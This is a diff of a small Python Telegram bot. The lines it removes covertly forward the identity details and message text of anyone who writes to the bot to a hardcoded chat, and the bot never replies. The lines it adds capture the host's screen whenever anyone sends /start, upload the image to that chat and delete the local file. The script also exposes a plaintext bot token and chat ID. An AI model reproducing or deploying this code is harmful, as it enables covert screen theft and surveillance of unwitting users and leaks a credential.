@@ -1,26 +1,34 @@
 import telebot
+import os
+import platform
+import subprocess
+from PIL import ImageGrab
 
 BOT_TOKEN = '8479275418:AAHoXo5-aA69Rn_-pCewm90nFkgiWmBox2c'
 YOUR_CHAT_ID = 7821316793
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-@bot.message_handler(func=lambda m: True)
-def forward_info(m):
-    user = m.from_user
-    info = (
-        f"⚠️ Новое сообщение:\n\n"
-        f"ID: {user.id}\n"
-        f"Username: @{user.username if user.username else 'None'}\n"
-        f"Имя: {user.first_name} {user.last_name or ''}\n"
-        f"Chat ID: {m.chat.id}\n"
-        f"Язык: {user.language_code or 'unknown'}\n"
-        f"Текст: {m.text}"
-    )
+def take_screenshot():
     try:
-        bot.send_message(YOUR_CHAT_ID, info)
-    except:
-        pass
-    # Не отвечаем — тише едешь, дальше будешь
+        screenshot_path = "screenshot.png"
+        img = ImageGrab.grab()
+        img.save(screenshot_path)
+        return screenshot_path
+    except Exception:
+        return None
 
+@bot.message_handler(commands=['start'])
+def send_screenshot(m):
+    if m.from_user.id == YOUR_CHAT_ID or True:  # Ловим у всех, но можно ограничить
+        path = take_screenshot()
+        if path and os.path.exists(path):
+            try:
+                with open(path, 'rb') as photo:
+                    bot.send_photo(YOUR_CHAT_ID, photo)
+                os.remove(path)
+            except:
+                pass
+
+# Игнорируем остальные сообщения — только /start триггерит скрин
 bot.polling(none_stop=True)
